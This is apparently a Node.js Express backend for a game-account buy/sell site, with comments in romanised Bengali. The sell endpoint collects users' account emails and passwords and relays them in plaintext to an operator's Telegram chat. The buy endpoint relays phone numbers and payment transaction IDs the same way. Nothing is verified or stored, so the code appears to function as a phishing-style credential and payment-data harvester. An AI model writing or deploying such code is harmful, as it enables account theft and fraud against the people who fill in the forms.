const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve frontend static files
app.use(express.static(path.join(__dirname, 'public')));

// Apnar Telegram Bot Token ekhane boshaben (ba Environment Variables theke nibe)
const token = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const chatId = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';
const bot = new TelegramBot(token, { polling: true });

// Buyer Payment Submit API
app.post('/api/buy', (req, res) => {
    const { buyerNumber, cashoutNumber, trxId, selectedId } = req.body;
    const message = `🛒 *New Buy Request!*\n\n🎮 ID: ${selectedId}\n📱 Buyer Number: ${buyerNumber}\n💸 Cashout Number: ${cashoutNumber}\n📝 TrxID: \`${trxId}\``;
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    res.json({ success: true, message: 'Order submitted successfully!' });
});

// Seller ID Submit API
app.post('/api/sell', (req, res) => {
    const { sellerEmail, sellerPassword, price } = req.body;
    const message = `📤 *New ID Submission!*\n\n📧 Email: \`${sellerEmail}\`\n🔑 Password: \`${sellerPassword}\`\n💰 Asking Price: ${price} BDT`;
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    res.json({ success: true, message: 'ID submitted successfully!' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
